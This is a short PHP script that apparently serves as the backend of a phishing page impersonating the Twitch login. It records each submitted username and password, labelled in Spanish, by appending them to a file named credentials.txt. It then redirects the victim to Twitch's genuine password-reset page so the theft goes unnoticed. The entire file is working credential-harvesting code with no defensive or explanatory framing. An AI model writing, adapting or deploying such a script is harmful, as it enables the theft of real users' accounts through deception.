<?php

file_put_contents("credentials.txt", "[+] Twitch -> Usuario: " . $_POST['Username'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://passport.twitch.tv/password_resets/new?');
exit();
?>
